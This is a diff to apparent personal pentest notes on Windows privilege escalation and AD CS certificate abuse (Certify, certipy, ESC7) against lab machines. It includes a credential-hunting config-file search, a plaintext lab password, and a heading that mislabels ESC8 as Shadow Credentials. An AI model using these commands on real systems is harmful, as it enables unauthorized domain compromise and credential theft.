@@ -228,6 +228,11 @@ cmd.exe /c dir /a C:\
 - don't overlook $Recycle.Bin
 	- `Get-ChildItem -Path 'C:\$Recycle.Bin' -Force`
 
+***search for config files***
+```
+Get-ChildItem -Path C:\ -Include *.config,*.ini,*.json,*.yml,*.yaml,*.xml,*.conf,*.cfg,*.env -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch '\\(Windows|Program Files|Program Files \(x86\)|ProgramData|Users\\(Default|Public))\\' }
+```
+
 add read permissions to a file:
 ```
 icacls "C:\backup\restore.txt" /grant "Everyone:(R)"
@@ -492,7 +497,7 @@ runas /user:dev-datasci-lowpriv "msiexec /quiet /qn /i C:\Users\dev-datasci-lowp
 - run msi shell as admin, catch shell with listener
 
 
-AD CS
+#### AD CS
 - upload Certify.exe
 ```
 ./certify.exe find /vulnerable
@@ -525,7 +530,7 @@ Can also run ADCS remotely with certipy
 certipy find -dc-ip 10.129.42.194 -ns 10.129.42.194 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
 ```
 - bottom of output will list vulnerabilities like ESC7
-	- exploit ESC7:
+##### ESC7:
 ```
 certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
 ```
@@ -558,6 +563,16 @@ sudo ntpdate 10.129.42.194
 ```
 - should sync time to machine, then run prior command
 - make take multiple attempts
+
+
+##### ESC4
+
+##### ESC8 (Shadow Credentials)
+Find user with WriteOwner & WriteDACL permissions (in Cert Publishers group for example)
+- upload Certify.exe to target machine as any user and run:
+```
+./Certify.exe find /domain:sequel.htb
+```
 
 RBCD (Resource Based Constrained Delegation) Attack ^062636
 - Requirements:
